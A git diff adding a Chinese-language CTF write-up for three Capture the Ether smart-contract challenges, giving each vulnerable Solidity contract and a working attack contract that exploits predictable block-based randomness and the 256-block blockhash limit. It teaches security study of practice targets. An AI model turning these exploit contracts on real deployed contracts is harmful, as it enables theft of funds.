@@ -158,5 +158,178 @@ contract GuessTheRandomNumberChallenge {
         <p>如图</p>
         <img src="https://yexingyu123456.github.io/photograph/bachang2.png">
         <img src="https://yexingyu123456.github.io/photograph/bachang1.png">
+        <br><br><br><br><br>
+        <h3>Guess the new number</h3>
+        <p>合约如下</p>
+        <pre><code>
+            pragma solidity ^0.4.21;
+
+contract GuessTheNewNumberChallenge {
+    function GuessTheNewNumberChallenge() public payable {
+        require(msg.value == 1 ether);
+    }
+
+    function isComplete() public view returns (bool) {
+        return address(this).balance == 0;
+    }
+
+    function guess(uint8 n) public payable {
+        require(msg.value == 1 ether);
+        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
+
+        if (n == answer) {
+            msg.sender.transfer(2 ether);
+        }
+    }
+}
+        </code></pre>
+        <p>我们直接使用一个合约来计算answer并就在那个合约中调用</p>
+        <p>合约如下</p>
+        <pre><code>
+            contract attack{
+                GuessTheNewNumberChallenge guesst;
+                function attack(address _addr)public{
+                    guesst = GuessTheNewNumberChallenge(_addr);
+                }
+                function att()public payable{
+                    uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
+                    guesst.guess.value(0.001 ether)(answer);
+                }
+                function()external payable{
+                    
+                }
+            }
+            
+        </code></pre>
+        <p>调用后即可通过</p>
+        <br><br><br><br><br><br><br>
+        <h3>Predict the future</h3>
+        <p>合约如下</p>
+        <pre><code>
+            pragma solidity ^0.4.21;
+
+contract PredictTheFutureChallenge {
+    address guesser;
+    uint8 guess;
+    uint256 settlementBlockNumber;
+
+    function PredictTheFutureChallenge() public payable {
+        require(msg.value == 0.001 ether);
+    }
+
+    function isComplete() public view returns (bool) {
+        return address(this).balance == 0;
+    }
+
+    function lockInGuess(uint8 n) public payable {
+        require(guesser == 0);
+        require(msg.value == 0.001 ether);
+
+        guesser = msg.sender;
+        guess = n;
+        settlementBlockNumber = block.number + 1;
+    }
+
+    function settle() public {
+        require(msg.sender == guesser);
+        require(block.number > settlementBlockNumber);
+
+        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
+
+        guesser = 0;
+        if (guess == answer) {
+            msg.sender.transfer(0.002 ether);
+        }
+    }
+}
+
+        </code></pre>
+        <p>他的answer是mod10之后的值，所以answer可能的值只有0-9，我们通过攻击合约进行爆破即可</p>
+        <pre><code>
+            contract attack{
+                PredictTheFutureChallenge pre;
+                uint8 public answer=5;
+                function attack(address _addr)public{
+                    pre = PredictTheFutureChallenge(_addr);
+                }
+                function lock()public payable{
+                    pre.lockInGuess.value(0.001 ether)(answer);
+                }
+                function att()public{
+                    uint8 temp = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
+                    if(temp == answer){
+                    pre.settle();
+                    }
+                }
+                function()external payable{
+                    
+                }
+            }
+            
+        </code></pre>
+        <br><br><br><br><br><br><br>
+        <h3>Pridict the block hash </h3>
+        <p>合约如下</p>
+        <pre><code>
+            contract PredictTheBlockHashChallenge {
+                address guesser;
+                bytes32 guess;
+                uint256 settlementBlockNumber;
+            
+                function PredictTheBlockHashChallenge() public payable {
+                    require(msg.value == 0.001 ether);
+                }
+            
+                function isComplete() public view returns (bool) {
+                    return address(this).balance == 0;
+                }
+            
+                function lockInGuess(bytes32 hash) public payable {
+                    require(guesser == 0);
+                    require(msg.value == 0.001 ether);
+            
+                    guesser = msg.sender;
+                    guess = hash;
+                    settlementBlockNumber = block.number + 1;
+                }
+            
+                function settle() public {
+                    require(msg.sender == guesser);
+                    require(block.number > settlementBlockNumber);
+            
+                    bytes32 answer = block.blockhash(settlementBlockNumber);
+            
+                    guesser = 0;
+                    if (guess == answer) {
+                        msg.sender.transfer(0.002 ether);
+                    }
+                }
+            }
+            
+        </code></pre>
+        <p>block.blockhash有一个特点，他只能得到256个区块内的哈希值，一旦超过256的区块，就无法返回对应的区块哈希，只会返回零</p>
+        <pre><code>
+            contract attack{
+                PredictTheBlockHashChallenge pre;
+                uint256 public blocknumber;
+                bytes32 answer;
+                function attack(address _addr)public{
+                    pre = PredictTheBlockHashChallenge(_addr);
+                }
+                function lock()public payable{
+                    blocknumber = block.number+1;
+                    pre.lockInGuess.value(0.001 ether)(answer);
+                }
+                function att()public{
+                    require(block.number-256>blocknumber);
+                    pre.settle();
+                }
+                function ()external payable{
+            
+                }
+            }
+            
+        </code></pre>
+        <p>部署两个合约，并调用攻击合约的lock函数，随后等到能够调用att函数，再调用att函数。</p>
     </body>
 </html>
